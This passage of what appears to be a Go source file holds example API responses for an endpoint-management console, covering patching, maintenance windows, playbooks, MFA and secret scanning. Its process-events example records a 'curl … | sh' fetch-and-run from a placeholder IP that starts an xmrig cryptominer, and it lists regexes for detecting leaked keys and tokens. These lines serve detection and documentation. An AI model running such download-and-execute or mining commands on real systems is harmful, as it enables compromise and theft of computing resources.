				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"manufacturer": "LENOVO",
				"model": "21HMCTO1WW",
				"serial": "PF4KX2QZ",
				"chassis": "laptop",
				"physical": true,
				"bios_date": "2025-03-11",
				"age_years": 1.6,
				"age_from": "firmware",
				"owner": "jdoe@example.com",
				"managed": true
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"manufacturer": "QEMU",
				"model": "Standard PC (Q35 + ICH9, 2009)",
				"chassis": "virtual",
				"physical": false,
				"bios_date": "2014-04-01",
				"managed": true
			}
		],
		"preset_missing": 5,
		"warn_days": 30
	}`,

	// logging
	"GET /api/admin/logging": `{"log_level": "info", "forward_enabled": true, "forward_target": "tcp://siem.corp.example.com:514", "forward_format": "rfc5424"}`,
	// What the server runs with once the update is applied: here the
	// level raised to debug, forwarding left as it was.
	"POST /api/admin/logging": `{"log_level": "debug", "forward_enabled": true, "forward_target": "tcp://siem.corp.example.com:514", "forward_format": "rfc5424"}`,

	// maintenance-windows: Weeknights holds the Windows endpoints' patches
	// until 22:00 UTC tonight, the window the patch preview waits for.
	// jdoe saved the body examples' window for the web servers this
	// morning, after the patch run. It takes effect on 3 November and
	// restricts nothing until then. next_open is in the window's own zone;
	// members is -1 for a window over every endpoint.
	"GET /api/maintenance-windows": `{
		"can_override": false,
		"windows": [
			{
				"id": "mw-a325a045fc8f0e72f264e4b29d4ebdee",
				"number": 1,
				"name": "Weeknights",
				"description": "Windows updates overnight, Monday to Thursday",
				"enabled": true,
				"group_ids": [],
				"weekdays": [1, 2, 3, 4],
				"start_time": "22:00",
				"duration_minutes": 360,
				"timezone": "UTC",
				"applies_to": ["patch"],
				"platform": "windows",
				"recurrence": "weekly",
				"interval": 1,
				"start_date": "",
				"month_day": 0,
				"month_week": 0,
				"month_weekday": 0,
				"time_base": "zone",
				"observe_dst": true,
				"created_by": "jdoe",
				"updated_by": "jdoe",
				"created_at": "2026-06-11T16:20:05Z",
				"updated_at": "2026-06-11T16:20:05Z",
				"open_now": false,
				"next_open": "2026-10-20T22:00:00Z",
				"members": -1
			},
			{
				"id": "mw-71d60f4259bf0cb7c61b58d1cd198b50",
				"number": 2,
				"name": "Web servers weeknight window",
				"description": "Deploys and patching after hours",
				"enabled": true,
				"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
				"weekdays": [2, 4],
				"start_time": "22:00",
				"duration_minutes": 240,
				"timezone": "America/New_York",
				"applies_to": ["deploy", "patch"],
				"platform": "linux",
				"recurrence": "weekly",
				"interval": 1,
				"start_date": "2026-11-03",
				"month_day": 0,
				"month_week": 0,
				"month_weekday": 0,
				"time_base": "zone",
				"observe_dst": true,
				"created_by": "jdoe",
				"updated_by": "jdoe",
				"created_at": "2026-10-20T09:40:27Z",
				"updated_at": "2026-10-20T09:40:27Z",
				"open_now": false,
				"next_open": "2026-11-03T22:00:00-05:00",
				"members": 12
			}
		]
	}`,
	"POST /api/maintenance-windows": `{"id": "mw-71d60f4259bf0cb7c61b58d1cd198b50"}`,
	// The body example asks about web-01 and FIN-LT-0142 for patching.
	// FIN-LT-0142 waits for Weeknights; the reason gives the next opening
	// in UTC. web-01 may be patched now: its window does not take effect
	// until 3 November.
	"POST /api/maintenance-windows/check": `{
		"can_override": false,
		"checked": 2,
		"waiting": {
			"agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9": "Waiting for maintenance window Weeknights; next opens Tue 2026-10-20 22:00 UTC"
		}
	}`,
	"PUT /api/maintenance-windows/{id}": `{"id": "mw-71d60f4259bf0cb7c61b58d1cd198b50"}`,

	// me
	"GET /api/me": `{
		"username": "jdoe",
		"display_name": "Jane Doe",
		"source": "local",
		"is_admin": false,
		"permissions": ["deploy.manage"],
		"email": "jdoe@example.com",
		"persona": "Service desk",
		"signed_in_at": "2026-10-20T07:31:02Z",
		"previous_sign_in": "2026-10-19T07:45:18Z",
		"server_time_zone": "UTC",
		"server_utc_offset_seconds": 0
	}`,

	// notifications
	"GET /api/notifications": `{
		"notifications": [
			{
				"id": "ntf-3c9e5a1f7b2d48e6a0c4b8d2f6e1a3c5",
				"severity": "info",
				"title": "Deployment finished: install jq",
				"body": "2 of 2 succeeded",
				"source": "deploy",
				"link": "/software?run=run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5#deployments",
				"created_at": "2026-10-19T13:03:22Z",
				"read": false
			},
			{
				"id": "ntf-8a2c6e0f4b1d47e9a3c5d7f9b1e3a0c6",
				"severity": "warning",
				"title": "App credential renewal failed: Payroll sync (Entra ID)",
				"body": "the connection's client secret has expired",
				"source": "Certificates",
				"link": "/certificates#apps",
				"created_at": "2026-10-18T02:00:07Z",
				"read": true
			}
		],
		"unread": 1
	}`,
	"GET /api/notifications/count": `{"unread": 1}`,

	// oidc-providers
	// ready says the provider's discovery document was fetched: its
	// sign-in button works.
	"GET /api/admin/oidc-providers": `{"providers": [{` + corpSSOProviderFields + `, "enabled": true, "ready": true}]}`,
	// The body example as stored, still disabled.
	"POST /api/admin/oidc-providers": `{` + corpSSOProviderFields + `, "enabled": false}`,
	// Enabled by the edit; the secret the body left out is kept.
	"PUT /api/admin/oidc-providers/{id}": `{` + corpSSOProviderFields + `, "enabled": true}`,

	// openapi.json
	// Abbreviated: the document itself, with one path and the one schema
	// it refers to, out of every route the server has.
	"GET /api/openapi.json": `{
		"openapi": "3.2.1",
		"info": {
			"title": "Mustra API",
			"version": "0.93.0",
			"description": "Every route the console uses. Authenticate with an API token (Settings → API tokens) as ` + "`Authorization: Bearer <token>`" + `; a token carries only the permissions it was given. Generated from the running server's route table.",
			"license": {"name": "AGPL-3.0-only", "identifier": "AGPL-3.0-only"}
		},
		"servers": [{"url": "/"}],
		"security": [{"bearer": []}, {"session": []}],
		"components": {
			"securitySchemes": {
				"bearer": {"type": "http", "scheme": "bearer"},
				"session": {"type": "apiKey", "in": "cookie", "name": "__Host-mustra_session"}
			},
			"schemas": {
				"VersionResponse": {
					"description": "VersionResponse is what GET /api/version answers.",
					"type": "object",
					"properties": {
						"agent": {"type": "string"},
						"build_time": {"type": "string"},
						"commit": {"type": "string"},
						"server": {"type": "string"}
					}
				}
			}
		},
		"tags": [{"name": "version"}],
		"paths": {
			"/api/version": {
				"get": {
					"operationId": "get_api_version",
					"summary": "Version",
					"description": "Any signed-in user or API token.",
					"tags": ["version"],
					"responses": {
						"200": {
							"description": "OK",
							"content": {
								"application/json": {
									"schema": {"$ref": "#/components/schemas/VersionResponse"},
									"example": {"agent": "0.57.41", "build_time": "2026-10-20T16:42:08Z", "commit": "6a51892e0c4d", "server": "0.93.0"}
								}
							}
						},
						"401": {"description": "Not signed in"},
						"403": {"description": "Missing permission"}
					}
				}
			}
		}
	}`,

	// patch-policies
	"GET /api/patch-policies": `{
		"policies": [
			{
				"id": "ppl-5c1e9a3f7b2d46e0a8c4b6d2f0e8a1c3",
				"name": "Security updates after a week",
				"kind": "allow",
				"description": "Web servers take security updates once the fleet has seen them for seven days",
				"enabled": true,
				"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
				"rules": ` + securityAfterAWeekRules + `,
				"created_by": "jdoe",
				"created_at": "2026-09-08T12:30:55Z",
				"updated_at": "2026-09-08T12:30:55Z",
				"matches": 14,
				"members": 12
			}
		]
	}`,
	// The body example is that list: created under this ID, then saved
	// again by it.
	"POST /api/patch-policies": `{"id": "ppl-5c1e9a3f7b2d46e0a8c4b6d2f0e8a1c3"}`,
	// Groups go by name, so the file moves to another mustra. exported_at
	// is the server's clock, with its nanoseconds.
	"GET /api/patch-policies/export": `{
		"exported_at": "2026-10-20T09:52:17.640318529Z",
		"patch_lists": [
			{
				"name": "Security updates after a week",
				"kind": "allow",
				"description": "Web servers take security updates once the fleet has seen them for seven days",
				"enabled": true,
				"groups": ["Web servers"],
				"rules": ` + securityAfterAWeekRules + `
			}
		],
		"version": 1
	}`,
	// The body example's block list is new here. A group this mustra
	// lacks is refused with a 400, so warnings is always empty (#115).
	"POST /api/patch-policies/import": `{"created": 1, "updated": 0, "warnings": []}`,
	"PUT /api/patch-policies/{id}":    `{"id": "ppl-5c1e9a3f7b2d46e0a8c4b6d2f0e8a1c3"}`,

	// patches
	"GET /api/patches": `{
		"agents": [
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "os": "linux", "site": "dc-east", "patch_count": 2, "collected_at": "2026-10-20T08:12:40.512Z", "platform": "ubuntu", "platform_version": "24.04", "distro": "ubuntu"},
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "os": "windows", "site": "hq", "patch_count": 1, "collected_at": "2026-10-20T07:55:03.208Z", "patching": "installing", "patching_since": "2026-10-20T07:58:14Z", "platform": "Microsoft Windows 11 Pro", "platform_version": "10.0.26100 Build 26100", "distro": "Microsoft Windows 11 Pro"}
		],
		"patches": [
			{
				"os": "linux",
				"name": "openssl",
				"severity": "security",
				"new_version": "3.0.13-0ubuntu3.5",
				"first_seen": "2026-10-15T06:10:22Z",
				"age_days": 5,
				"affected_count": 1,
				"affected_agents": [
					{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "current_version": "3.0.13-0ubuntu3.4", "new_version": "3.0.13-0ubuntu3.5"}
				]
			},
			{
				"os": "windows",
				"name": "2026-10 Cumulative Update for Windows 11 Version 24H2 for x64-based Systems (KB5066835)",
				"severity": "security",
				"restart_required": true,
				"first_seen": "2026-10-14T18:02:47Z",
				"age_days": 6,
				"affected_count": 1,
				"affected_agents": [
					{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142"}
				]
			}
		]
	}`,
	"POST /api/patches/deploy": `{
		"run_id": "run-0e7c3a9f5b1d48e2a6c4f8b0d2e9a1c3",
		"target_desc": "2 selected endpoint(s)",
		"matched": 2,
		"started": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4"],
		"failed": {"agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9": "already patching (installing, began 4m ago); wait for that job to finish"}
	}`,
	"POST /api/patches/deploy/preview": `{
		"endpoints": [
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "pending": 2, "allowed": 1, "blocked": 1},
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "pending": 1, "allowed": 1, "blocked": 0, "waiting": "Waiting for maintenance window Weeknights; next opens Tue 2026-10-20 22:00 UTC"}
		],
		"matched": 2,
		"totals": {"pending": 3, "allowed": 2, "blocked": 1, "waiting": 1}
	}`,
	"GET /api/patches/deployments": `{
		"active": [{` + patchRunFields + `, "status": "installing", "outcomes": {"succeeded": 1, "installing": 1}, "kind": "bulk", "category": "patch"}],
		"deployments": [
			{` + patchRunFields + `, "status": "installing", "outcomes": {"succeeded": 1, "installing": 1}, "kind": "bulk", "category": "patch"},
			{"id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "schedule_name": "install jq", "target_desc": "jq", "agent_count": 2, "triggered_by": "jdoe", "started_at": "2026-10-19T13:02:44Z", "status": "succeeded", "outcomes": {"succeeded": 2}, "kind": "bulk", "category": "software", "console_output": true}
		],
		"inactive": [
			{"id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "schedule_name": "install jq", "target_desc": "jq", "agent_count": 2, "triggered_by": "jdoe", "started_at": "2026-10-19T13:02:44Z", "status": "succeeded", "outcomes": {"succeeded": 2}, "kind": "bulk", "category": "software", "console_output": true}
		]
	}`,
	"GET /api/patches/deployments/{id}": `{
		"deployment": {` + patchRunFields + `, "status": "installing", "outcomes": {"succeeded": 1, "installing": 1}, "kind": "bulk", "category": "patch"},
		"devices": [
			{
				"id": "act-2f8b4d0a6c1e47e9b3a5d7f9c1e0b2a4",
				"run_id": "run-0e7c3a9f5b1d48e2a6c4f8b0d2e9a1c3",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"kind": "patch_apply",
				"summary": "Apply pending patches (bulk deployment)",
				"status": "succeeded",
				"detail": "2 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.",
				"requested_by": "jdoe",
				"started_at": "2026-10-20T07:58:15Z",
				"finished_at": "2026-10-20T08:03:41Z",
				"hostname": "web-01"
			},
			{
				"id": "act-7a3c9e1b5d2f48a6c0e4b8d2f6a1c9e5",
				"run_id": "run-0e7c3a9f5b1d48e2a6c4f8b0d2e9a1c3",
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"kind": "patch_apply",
				"summary": "Apply pending patches (bulk deployment)",
				"status": "installing",
				"detail": "",
				"requested_by": "jdoe",
				"started_at": "2026-10-20T07:58:15Z",
				"finished_at": null,
				"hostname": "FIN-LT-0142"
			}
		]
	}`,
	"GET /api/patches/history": `{"runs": [{` + patchRunFields + `}]}`,
	// The list joins in the patch list's name.
	"GET /api/patches/list-assignments": `{
		"assignments": [
			{
				"id": "plassign-a33d5f94ba7e861d8bca4bf3c3aca4e0",
				"patch_list_id": "plist-9d3f7b1e5a2c48e6b0d4a8c2f6e1b3d5",
				"patch_list_name": "Approved Ubuntu mirror",
				"target_platform": "ubuntu",
				"target_site": "dc-east",
				"target_agent": "",
				"created_at": "2026-08-21T10:09:52Z",
				"created_by": "jdoe"
			}
		]
	}`,
	// The body example's assignment, with its list's name joined in as
	// the list has it.
	"POST /api/patches/list-assignments": `{
		"id": "plassign-4e7a9f004d4ba0c503d272246ab212d0",
		"patch_list_id": "plist-3a7e1c9b5d2f48a6b0e4c8d2f6a1b3e5",
		"patch_list_name": "Debian internal mirror",
		"target_platform": "",
		"target_site": "",
		"target_agent": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"created_at": "2026-10-20T10:03:28Z",
		"created_by": "jdoe"
	}`,
	"GET /api/patches/lists": `{
		"patch_lists": [
			{
				"id": "plist-9d3f7b1e5a2c48e6b0d4a8c2f6e1b3d5",
				"name": "Approved Ubuntu mirror",
				"os_family": "apt",
				"repos": "deb http://mirror.corp.example.com/ubuntu noble-security main",
				"description": "Only the security pocket of the internal mirror",
				"created_at": "2026-08-21T10:05:37Z",
				"created_by": "jdoe"
			}
		]
	}`,
	// The body example's patch list.
	"POST /api/patches/lists": `{
		"id": "plist-0b5e9d3a7c1f42e8a6d4b2c8e0f6a1d3",
		"name": "Debian internal mirror",
		"os_family": "apt",
		"repos": "deb https://mirror.corp.example.com/debian bookworm main\ndeb https://mirror.corp.example.com/debian-security bookworm-security main",
		"description": "Scan and patch from the internal mirror only",
		"created_at": "2026-10-20T10:01:44Z",
		"created_by": "jdoe"
	}`,
	"POST /api/patches/rescan": `{
		"asked": 2,
		"refreshed": 1,
		"failed": [],
		"no_response": [],
		"searching": [{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "error": "still searching (Windows Update can take a few minutes); the list updates when it finishes"}]
	}`,
	"GET /api/patches/schedules": `{
		"schedules": [
			{
				"id": "psched-4b8d2f6a0c1e47e3a9c5b7d1f3e0a8c2",
				"name": "Web servers, Wednesday night",
				"target_os": "linux",
				"target_site": "",
				"target_agent": "",
				"target_vuln_id": "",
				"target_agents": [],
				"kind": "weekly",
				"run_at": null,
				"time_of_day": "22:00",
				"weekday": 3,
				"enabled": true,
				"last_run_at": "2026-10-14T22:00:04Z",
				"next_run_at": "2026-10-21T22:00:00Z",
				"created_at": "2026-07-30T14:11:20Z",
				"created_by": "jdoe"
			}
		]
	}`,
	// The body example, created on a Tuesday morning: its first run is
	// tonight at 22:00 UTC.
	"POST /api/patches/schedules": `{
		"id": "psched-540ea4ce7babf7fb8dbe85da6d80939a",
		"name": "Weekly patching for web servers",
		"target_os": "",
		"target_site": "",
		"target_agent": "",
		"target_vuln_id": "",
		"target_agents": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9"],
		"kind": "weekly",
		"run_at": null,
		"time_of_day": "22:00",
		"weekday": 2,
		"enabled": true,
		"last_run_at": null,
		"next_run_at": "2026-10-20T22:00:00Z",
		"created_at": "2026-10-20T10:05:51Z",
		"created_by": "jdoe"
	}`,

	// playbook-triggers: the list never shows a token, only that there
	// is one; min_cooldown is the floor under min_interval_seconds.
	"GET /api/playbook-triggers": `{"min_cooldown": 60, "triggers": [` + playbookTriggerFiredExample + `]}`,
	// The one answer that carries the webhook token: the save that
	// issued it.
	"POST /api/playbook-triggers": `{` + playbookTriggerWebhookFields + `,
		"token": "<webhook token, shown once>",
		"has_token": true,
		"min_interval_seconds": 3600,
		"fire_count": 0,
		` + playbookTriggerCreated + `
	}`,
	// A webhook trigger that stays one keeps its token, so the answer
	// does not show it again.
	"PUT /api/playbook-triggers/{id}": playbookTriggerFiredExample,

	// playbook-approvals
	// Newest first. The run's two canary web servers reached the gate
	// and wait on the one decision, which rpatel, who started the run,
	// cannot make. Last week's scheduled run of the same playbook was
	// approved. run_name is the run's.
	"GET /api/playbook-approvals": `{
		"pauses": [
			{
				"run_id": "pbr-5a9c3e7f1b2d48e6a0c4d8b2f6e1a3b9",
				"playbook_id": "pb-3c7e1a9f5b2d48e6a0c4f8b2d6e1a7c5",
				"run_name": "Kernel update for web servers",
				"step_index": 1,
				"step_name": "Canary check",
				"agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "agt-2c6e0a4f8b1d47e3a9c5f7b1d3e9a0c2"],
				"state": "pending",
				"reason": "Check the canary web servers are healthy before the rollout continues.",
				"requested_by": "rpatel",
				"created_at": "2026-10-20T10:04:12Z",
				"expires_at": "2026-10-21T10:04:12Z"
			},
			{
				"run_id": "pbr-1d5f9b3e7a2c46e8b0d4f6a8c2e1b3d9",
				"playbook_id": "pb-3c7e1a9f5b2d48e6a0c4f8b2d6e1a7c5",
				"run_name": "Kernel update for web servers",
				"step_index": 1,
				"step_name": "Canary check",
				"agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "agt-2c6e0a4f8b1d47e3a9c5f7b1d3e9a0c2"],
				"state": "approved",
				"reason": "Check the canary web servers are healthy before the rollout continues.",
				"requested_by": "scheduler",
				"decided_by": "jdoe",
				"note": "Both canaries are serving normally",
				"created_at": "2026-10-13T22:06:51Z",
				"expires_at": "2026-10-14T22:06:51Z",
				"decided_at": "2026-10-13T22:12:37Z"
			}
		]
	}`,
	// The body example approves the pending run above: endpoints is how
	// many were waiting at the gate and now carry on.
	"POST /api/playbook-approvals/{id}": `{"endpoints": 2, "state": "approved"}`,

	// playbooks
	"GET /api/playbooks": `{
		"playbooks": [` + playbookWeeklyRecord + `],
		"runs": ` + playbookRunsJSON + `
	}`,
	// A new playbook has not run yet.
	"POST /api/playbooks": `{"playbook": {` + playbookWeeklyFields + `,
		"created_at": "2026-10-20T09:20:31Z",
		"created_by": "jdoe",
		"updated_at": "2026-10-20T09:20:31Z",
		"updated_by": "jdoe"
	}}`,
	"GET /api/playbooks/runs": `{"runs": ` + playbookRunsJSON + `}`,
	// What the live view polls. A run walks five endpoints at a time:
	// web-01 has patched, so web-06 has started; web-02 to web-05 are
	// still installing, and the other six have no row yet.
	"GET /api/playbooks/runs/{id}": `{
		"results": [
			{"run_id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "step_index": 0, "step_name": "Apply pending patches", "kind": "patch", "status": "succeeded", "detail": "Verified: all 7 update(s) are installed.\\n7 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.", "started_at": "2026-10-20T09:31:08Z", "finished_at": "2026-10-20T09:34:49Z"},
			{"run_id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6", "agent_id": "agt-2c6e0a4f8b1d47e3a9c5f7b1d3e9a0c2", "hostname": "web-02", "step_index": 0, "step_name": "Apply pending patches", "kind": "patch", "status": "running", "detail": "", "started_at": "2026-10-20T09:31:08Z", "finished_at": null},
			{"run_id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6", "agent_id": "agt-6a0e4c8f2b1d47e9a5c3d7f1b9e2a4c6", "hostname": "web-03", "step_index": 0, "step_name": "Apply pending patches", "kind": "patch", "status": "running", "detail": "", "started_at": "2026-10-20T09:31:08Z", "finished_at": null},
			{"run_id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6", "agent_id": "agt-8c2e6a0f4b1d47e3a9c5b7d1f3e9a0c4", "hostname": "web-04", "step_index": 0, "step_name": "Apply pending patches", "kind": "patch", "status": "running", "detail": "", "started_at": "2026-10-20T09:31:08Z", "finished_at": null},
			{"run_id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6", "agent_id": "agt-0e4a8c2f6b1d47e9a3c5f7b9d1e2a4c8", "hostname": "web-05", "step_index": 0, "step_name": "Apply pending patches", "kind": "patch", "status": "running", "detail": "", "started_at": "2026-10-20T09:31:08Z", "finished_at": null},
			{"run_id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6", "agent_id": "agt-3b7f1d5a9c2e48e6b0a4d8f2c6e1a3b7", "hostname": "web-06", "step_index": 0, "step_name": "Apply pending patches", "kind": "patch", "status": "running", "detail": "", "started_at": "2026-10-20T09:34:49Z", "finished_at": null}
		],
		"run": ` + playbookRunManualExample + `
	}`,
	"GET /api/playbooks/{id}":      `{"playbook": ` + playbookWeeklyRecord + `}`,
	"PUT /api/playbooks/{id}":      `{"playbook": ` + playbookWeeklyRecord + `}`,
	"DELETE /api/playbooks/{id}":   `{"deleted": "Weekly patching for web servers"}`,
	"POST /api/playbooks/{id}/run": `{"endpoints": 12, "playbook": "Weekly patching for web servers", "run_id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6"}`,

	// preferences
	"GET /api/preferences": jdoePreferencesExample,
	"PUT /api/preferences": jdoePreferencesExample,

	// mfa: jdoe, a local account, turned it on and has spent two of the
	// ten recovery codes. Secrets and codes are shown once, so they are
	// placeholders here.
	"GET /api/me/mfa":                 `{"applies": true, "available": true, "required": false, "enabled": true, "enabled_at": "2026-10-30T16:04:11Z", "recovery_codes_left": 8}`,
	"POST /api/me/mfa/setup":          `{"secret": "<secret>", "otpauth_uri": "otpauth://totp/mustra:jdoe@console.corp.example.com?algorithm=SHA1&digits=6&issuer=mustra&period=30&secret=<secret>", "qr_svg": "<svg class=\"qr\" viewBox=\"0 0 37 37\" role=\"img\" aria-label=\"QR code for your authenticator app\">…</svg>"}`,
	"POST /api/me/mfa/enable":         mfaRecoveryCodesExample,
	"POST /api/me/mfa/recovery-codes": mfaRecoveryCodesExample,
	"POST /api/me/mfa/disable":        `{"applies": true, "available": true, "required": false, "enabled": false, "recovery_codes_left": 0}`,

	// process-events
	// Newest first: the miner the kill-process example stops, started by
	// a shell on web-01. No indicator or signal names it, so neither row
	// is matched. The counts are of the last day, starts summed.
	"GET /api/process-events": `{
		"events": [
			{"id": 5520931, "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "pid": 48213, "ppid": 48190, "name": "xmrig", "cmdline": "/tmp/.cache/xmrig -o pool.example.net:3333 --donate-level 1", "username": "www-data", "at": "2026-10-20T07:52:10Z", "source": "netlink", "kind": "start", "count": 1},
			{"id": 5520930, "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "pid": 48190, "ppid": 1022, "name": "sh", "cmdline": "sh -c curl -fsSL http://203.0.113.50/x.sh | sh", "username": "www-data", "at": "2026-10-20T07:52:08Z", "source": "netlink", "kind": "start", "count": 1}
		],
		"matched_retention_days": 30,
		"retention_hours": 48,
		"summary": {"last_24h": 182340, "matched_24h": 0, "suppressed_24h": 0, "unidentified_24h": 12, "endpoints_reporting": 40, "endpoints_kernel_sourced": 34}
	}`,

	// query
	"POST /api/query": `{"query_id": "q-4e0a6c2f8b1d49e3a7c5b9d1f3e8a0c6", "expected": 1}`,

	// remote
	// The connection settings as saved, the answer an administrator gets
	// from GET /api/remote/config: Guacamole, with its JSON secret set,
	// offering temporary accounts and recording sessions.
	"POST /api/admin/remote": `{
		"beyondtrust_site": "",
		"custom_url": "",
		"enabled": true,
		"guacamole_key_set": true,
		"guacamole_url": "https://guac.corp.example.com/guacamole",
		"jit": "offer",
		"provider": "guacamole",
		"recording": true
	}`,

	// reveal
	// The numbers are taken from the findings and scans below. rules
	// counts the two rules, not the quick search; endpoints_scanned
	// leaves out build-mac-02, whose scan never started.
	"GET /api/reveal/overview": `{
		"endpoints": 3,
		"pattern_names": {
			"aws_access_key": "AWS access key ID",
			"credit_card": "Payment card number",
			"email": "Email address",
			"github_token": "GitHub token",
			"iban": "IBAN",
			"jwt": "JSON Web Token",
			"password_assignment": "Password or secret in a config",
			"phone_us": "US phone number",
			"private_key": "Private key",
			"ssn_us": "US Social Security number"
		},
		"rules": 2,
		"rules_enabled": 1,
		"summary": {
			"endpoints_with_confirmed": 2,
			"endpoints_with_unconfirmed": 0,
			"endpoints_scanned": 2,
			"endpoints_running": 0,
			"files_matched": 4,
			"confirmed_files": 4,
			"by_pattern": {"aws_access_key": 1, "credit_card": 1, "password_assignment": 1, "quick": 1},
			"by_endpoint": {"FIN-LT-0142": 1, "web-01": 3}
		}
	}`,
	// The built-in patterns, the same on every server.
	"GET /api/reveal/patterns": `{
		"patterns": [
			{"id": "credit_card", "name": "Payment card number", "regex": "\\b(?:\\d{4}[ -]\\d{4}[ -]\\d{4}[ -]\\d{4}(?:[ -]\\d{1,3})?|\\d{4}[ -]\\d{6}[ -]\\d{5}|\\d{13,19})\\b", "validate": "luhn"},
			{"id": "ssn_us", "name": "US Social Security number", "regex": "\\b\\d{3}[- ]\\d{2}[- ]\\d{4}\\b", "validate": "ssn"},
			{"id": "iban", "name": "IBAN", "regex": "\\b[A-Z]{2}\\d{2}(?:[ ]?[A-Z0-9]{4}){2,7}(?:[ ]?[A-Z0-9]{1,4})?\\b", "validate": "iban"},
			{"id": "email", "name": "Email address", "regex": "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}\\b"},
			{"id": "phone_us", "name": "US phone number", "regex": "(?:\\+?1[ .-]?)?(?:\\([2-9]\\d{2}\\)[ .-]?|\\b[2-9]\\d{2}[ .-])[2-9]\\d{2}[ .-]\\d{4}\\b"},
			{"id": "aws_access_key", "name": "AWS access key ID", "regex": "\\b(?:AKIA|ASIA)[0-9A-Z]{16}\\b"},
			{"id": "private_key", "name": "Private key", "regex": "-----BEGIN (?:RSA |EC |DSA |OPENSSH |ENCRYPTED |)PRIVATE KEY-----[ \\t]*\\r?\\n[ \\t]*[A-Za-z0-9+/=]{20,}"},
			{"id": "password_assignment", "name": "Password or secret in a config", "regex": "(?i)[a-z0-9_.-]*(?:password|passwd|pwd|secret|api[_-]?key|access[_-]?token|auth[_-]?token)\\s*[=:]\\s*(?:[\"'][^\"'\\n<>]{6,}[\"']|[^\\s\"',;()\\[\\]{}<>&]{0,48}[0-9!@$%^*+/][^\\s\"',;()\\[\\]{}<>&]{0,48})", "validate": "secret"},
			{"id": "github_token", "name": "GitHub token", "regex": "\\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}\\b|\\bgithub_pat_[A-Za-z0-9_]{60,}\\b"},
			{"id": "jwt", "name": "JSON Web Token", "regex": "\\beyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\b"}
		]
	}`,
	// Confirmed findings first, then the latest. A snippet is masked on
	// the endpoint, down to the match's last four letters or digits; the
	// card rule asks for none. A quick search's pattern is "quick".
	"GET /api/reveal/results": `{
		"matches": [
			{
				"rule_id": "rvl-3a7c1e9f5b2d48a6c0e4f8b2d6a1c9e3",
				"rule_name": "Payment cards on finance shares",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"path": "/srv/finance/exports/settlements-2026-09.csv",
				"pattern_id": "credit_card",
				"count": 14,
				"confirmed": 12,
				"size": 48213,
				"modified": "2026-10-01T06:00:12Z",
				"first_seen": "2026-10-02T03:06:58Z",
				"last_seen": "2026-10-20T03:06:58Z"
			},
			{
				"rule_id": "quick-5c1a9e3f7b2d4086a4e8c0f2b6d9a1e7",
				"rule_name": "Quick search: syslog-old.corp.example.com",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"path": "/etc/rsyslog.d/50-forward.conf",
				"pattern_id": "quick",
				"count": 1,
				"confirmed": 1,
				"size": 80,
				"modified": "2025-11-04T16:22:09Z",
				"snippet": "the old collector *.* @@******-***.****.******e.com:514",
				"first_seen": "2026-10-20T08:12:44Z",
				"last_seen": "2026-10-20T08:12:44Z"
			},
			{
				"rule_id": "rvl-8e2d6b0f4a1c47e9b3d5f7a9c1e0b2d4",
				"rule_name": "Secrets — keys, tokens and passwords",
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"path": "C:\\Users\\asmith\\Documents\\aws-setup.txt",
